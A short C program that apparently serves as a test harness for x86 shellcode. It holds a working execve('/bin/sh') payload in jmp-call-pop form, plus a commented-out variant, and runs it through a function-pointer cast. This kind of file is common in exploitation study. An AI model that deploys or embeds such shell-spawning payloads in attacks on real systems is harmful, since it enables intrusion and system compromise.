#include <stdio.h>

unsigned char code1[] = "\xb8\x0a\x00\x00\x00\xc3";

int main(int argc, char **argv) {
//  int foo_value = 0;
//char *code = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\xb0\x0b\xcd\x80";
char *code = "\xeb\x09\x31\xc0\x5b\x89\xc1\xb0\x0b\xcd\x80\xe8\xf2\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
(*(void(*)()) code)();
  //int (*foo)() = (int(*)())code;
  //foo_value = foo();

  //printf("%d\n", foo_value);
}

